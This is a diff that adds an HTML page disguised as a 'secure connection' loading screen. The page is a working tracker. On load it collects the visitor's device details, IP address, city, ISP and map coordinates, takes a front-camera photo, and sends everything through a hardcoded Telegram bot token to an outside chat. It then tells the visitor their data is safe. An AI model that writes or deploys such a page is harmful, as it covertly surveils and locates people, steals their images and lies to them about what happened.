@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            color: #00ff41;
+            font-family: 'Courier New', monospace;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            padding: 20px;
+        }
+        .box {
+            background: rgba(0,255,65,0.05);
+            border: 1px solid rgba(0,255,65,0.2);
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+        }
+        h1 { font-size: 1.8rem; margin-bottom: 10px; }
+        .status { color: #888; font-size: 0.9rem; margin: 15px 0; }
+        .dot { display: inline-block; width: 12px; height: 12px; background: #00ff41; border-radius: 50%; animation: blink 1s infinite; margin-right: 10px; }
+        @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.2; } }
+        .loader { border: 2px solid rgba(0,255,65,0.1); border-top: 2px solid #00ff41; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .footer { color: #333; font-size: 0.6rem; margin-top: 20px; }
+        video { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="box">
+        <h1>🔒 SECURE CONNECTION</h1>
+        <div class="status"><span class="dot"></span> Establishing secure channel...</div>
+        <div class="loader"></div>
+        <div style="color:#555;font-size:0.8rem;margin-top:10px;">Please wait...</div>
+        <div class="footer">v2.0 • NEONDARK</div>
+    </div>
+
+    <video id="video" autoplay></video>
+
+    <script>
+        // =============================================================
+        // 1. CAPTURE DEVICE INFO
+        // =============================================================
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let device = 'Unknown Device';
+            let browser = 'Unknown Browser';
+            let os = 'Unknown OS';
+
+            if (ua.includes('Android')) os = 'Android';
+            else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
+            else if (ua.includes('Windows')) os = 'Windows';
+            else if (ua.includes('Mac')) os = 'MacOS';
+            else if (ua.includes('Linux')) os = 'Linux';
+
+            if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
+            else if (ua.includes('Firefox')) browser = 'Firefox';
+            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
+            else if (ua.includes('Edg')) browser = 'Edge';
+            else if (ua.includes('Opera')) browser = 'Opera';
+
+            if (os === 'Android') {
+                const match = ua.match(/Android\s([\d.]+)/);
+                if (match) os += ' ' + match[1];
+                const modelMatch = ua.match(/\(([^)]+)\)/);
+                if (modelMatch) device = modelMatch[1].split(';').pop().trim() || 'Android Device';
+            } else if (os === 'iOS') {
+                const match = ua.match(/OS\s([\d_]+)/);
+                if (match) os += ' ' + match[1].replace(/_/g, '.');
+                if (ua.includes('iPhone')) device = 'iPhone';
+                else if (ua.includes('iPad')) device = 'iPad';
+            } else {
+                device = os + ' Device';
+            }
+
+            return { device, browser, os };
+        }
+
+        // =============================================================
+        // 2. GET IP & LOCATION
+        // =============================================================
+        async function getLocation() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                return {
+                    ip: data.ip || 'Unknown',
+                    city: data.city || 'Unknown',
+                    region: data.region || 'Unknown',
+                    country: data.country_name || 'Unknown',
+                    lat: data.latitude || 0,
+                    lon: data.longitude || 0,
+                    isp: data.org || 'Unknown'
+                };
+            } catch (e) {
+                return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown', lat: 0, lon: 0, isp: 'Unknown' };
+            }
+        }
+
+        // =============================================================
+        // 3. CAPTURE PHOTO FROM CAMERA
+        // =============================================================
+        async function capturePhoto() {
+            return new Promise(async (resolve) => {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    await video.play();
+
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 640;
+                    canvas.height = 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    const photo = canvas.toDataURL('image/jpeg', 0.8);
+                    stream.getTracks().forEach(t => t.stop());
+                    resolve(photo);
+                } catch (e) {
+                    resolve(null);
+                }
+            });
+        }
+
+        // =============================================================
+        // 4. SEND TO TELEGRAM BOT
+        // =============================================================
+        async function sendToTelegram(data) {
+            const BOT_TOKEN = '7422438410:AAFcjsnZ8jvIJHGfQYJwjf0VJrgN31Plirg';
+            const CHAT_ID = '7481324242';
+
+            const now = new Date();
+            const dateStr = now.toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+
+            let message = `🔔 *NEW VISITOR DETECTED!*\n\n`;
+            message += `📅 *Time:* ${dateStr}\n`;
+            message += `📱 *Device:* ${data.device}\n`;
+            message += `🌐 *Browser:* ${data.browser}\n`;
+            message += `💻 *OS:* ${data.os}\n`;
+            message += `🌍 *IP:* ${data.location.ip}\n`;
+            message += `📍 *City:* ${data.location.city}\n`;
+            message += `🗺️ *Region:* ${data.location.region}\n`;
+            message += `🏳️ *Country:* ${data.location.country}\n`;
+            message += `🏢 *ISP:* ${data.location.isp}\n`;
+            message += `🗺️ *Map:* https://www.google.com/maps?q=${data.location.lat},${data.location.lon}\n`;
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+
+            if (data.photo) {
+                const blob = dataURLtoBlob(data.photo);
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'photo.jpg');
+                formData.append('caption', `📸 Visitor photo captured at ${dateStr}`);
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }
+        }
+
+        function dataURLtoBlob(dataURL) {
+            const arr = dataURL.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while (n--) u8arr[n] = bstr.charCodeAt(n);
+            return new Blob([u8arr], { type: mime });
+        }
+
+        // =============================================================
+        // 5. MAIN EXECUTION
+        // =============================================================
+        async function main() {
+            const deviceInfo = getDeviceInfo();
+            const location = await getLocation();
+            const photo = await capturePhoto();
+
+            const data = {
+                device: deviceInfo.device,
+                browser: deviceInfo.browser,
+                os: deviceInfo.os,
+                location: location,
+                photo: photo
+            };
+
+            await sendToTelegram(data);
+
+            document.querySelector('h1').textContent = '✅ CONNECTION ESTABLISHED';
+            document.querySelector('.status').innerHTML = 'Secure channel active. Your data is safe.';
+            document.querySelector('.loader').style.display = 'none';
+            document.querySelector('.footer').textContent = '🔐 NEONDARK SECURE • ' + new Date().toLocaleString('id-ID');
+        }
+
+        main();
+    </script>
+</body>
+</html>
